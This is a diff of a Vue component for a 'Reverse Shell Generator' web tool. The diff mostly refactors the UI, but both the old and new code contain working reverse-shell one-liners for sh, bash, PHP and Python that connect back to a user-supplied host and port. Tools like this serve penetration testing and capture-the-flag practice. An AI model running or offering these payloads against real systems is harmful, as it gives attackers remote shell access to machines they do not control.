@@ -1,33 +1,45 @@
 <script setup lang="ts">
-import { ref } from 'vue'
+import { ref, computed } from 'vue'
 
 const host = ref('10.10.10.10')
 const port = ref('4444')
 const copied = ref<string | null>(null)
 
-const shells: Record<string, (h: string, p: string) => string> = {
-  sh: (h, p) => `sh -i >& /dev/tcp/${h}/${p} 0>&1`,
-  bash: (h, p) => `bash -i >& /dev/tcp/${h}/${p} 0>&1`,
-  php: (h, p) => `php -r '$sock=fsockopen("${h}",${p});exec("/bin/sh -i <&3 >&3 2>&3");'`,
-  python: (h, p) => `python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("${h}",${p}));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'`,
+interface Shell {
+  id: string
+  label: string
+  build: (h: string, p: string) => string
 }
 
-const activeTab = ref('sh')
+const shells: Shell[] = [
+  { id: 'sh', label: 'SH', build: (h, p) => `sh -i >& /dev/tcp/${h}/${p} 0>&1` },
+  { id: 'bash', label: 'Bash', build: (h, p) => `bash -i >& /dev/tcp/${h}/${p} 0>&1` },
+  { id: 'php', label: 'PHP', build: (h, p) => `php -r '$sock=fsockopen("${h}",${p});exec("/bin/sh -i <&3 >&3 2>&3");'` },
+  { id: 'python', label: 'Python', build: (h, p) => `python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("${h}",${p}));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'` },
+]
 
-async function copyToClipboard(text: string, type: string) {
+const activeTab = ref('sh')
+const activeShell = computed(() => shells.find(s => s.id === activeTab.value) ?? shells[0])
+const activePayload = computed(() =>
+  host.value && port.value
+    ? activeShell.value.build(host.value, port.value)
+    : 'Enter host and port to generate payload'
+)
+
+async function copyToClipboard(text: string, id: string) {
   try {
     await navigator.clipboard.writeText(text)
-    copied.value = type
+    copied.value = id
     setTimeout(() => { copied.value = null }, 2000)
   } catch { /* ignore */ }
 }
 </script>
 
 <template>
-  <div class="card w-full p-6 space-y-6">
+  <div class="w-full space-y-6">
     <div class="space-y-1">
-      <h1 class="text-2xl font-800 text-link">Reverse Shell Generator</h1>
-      <p class="text-sm text-neutral-400">Generate reverse shell payloads for various languages</p>
+      <h1 class="text-title">Reverse Shell Generator</h1>
+      <p class="text-sm text-main op-70">Generate reverse shell payloads for various languages</p>
     </div>
 
     <div class="grid grid-cols-2 gap-4">
@@ -41,30 +53,31 @@ async function copyToClipboard(text: string, type: string) {
       </div>
     </div>
 
-    <div class="flex gap-2 border-b border-neutral-700/50 pb-2">
+    <div class="flex gap-2 border-b border-main !border-op-30 pb-2 flex-wrap">
       <button
-        v-for="key in Object.keys(shells)"
-        :key="key"
-        @click="activeTab = key"
+        v-for="shell in shells"
+        :key="shell.id"
+        type="button"
+        @click="activeTab = shell.id"
         :class="[
-          'px-3 py-1.5 text-sm rd-1 transition-all duration-200 cursor-pointer decoration-none border-none',
-          activeTab === key
-            ? 'text-link op-100 bg-neutral-700/30'
-            : 'text-link op-60 hover:op-100'
+          'px-3 py-1.5 text-sm rd-1 transition-opacity duration-200 cursor-pointer decoration-none border-none bg-transparent text-link',
+          activeTab === shell.id ? 'opacity-100 bg-neutral-500/15' : 'opacity-60 hover:opacity-100'
         ]"
       >
-        {{ key === 'bash' ? 'Bash' : key.toUpperCase() }}
+        {{ shell.label }}
       </button>
     </div>
 
-    <div v-for="(generator, key) in shells" :key="key" v-show="activeTab === key" class="relative">
-      <pre class="bg-hex-161b22 rd-1 p-4 text-sm font-mono whitespace-pre-wrap break-all overflow-x-auto"><code>{{ host && port ? generator(host, port) : 'Enter host and port to generate payload' }}</code></pre>
+    <div class="relative">
+      <pre class="bg-hex-161b22 rd-1 p-4 text-sm font-mono text-main whitespace-pre-wrap break-all overflow-x-auto m-0"><code>{{ activePayload }}</code></pre>
       <button
         v-if="host && port"
-        @click="copyToClipboard(generator(host, port), key)"
+        type="button"
+        @click="copyToClipboard(activePayload, activeTab)"
         class="absolute top-2 right-2 btn-ghost h-7 w-7 p-0"
+        aria-label="Copy"
       >
-        <i v-if="copied === key" class="i-mdi-check text-green-500" />
+        <i v-if="copied === activeTab" class="i-mdi-check text-green-500" />
         <i v-else class="i-mdi-content-copy" />
       </button>
     </div>
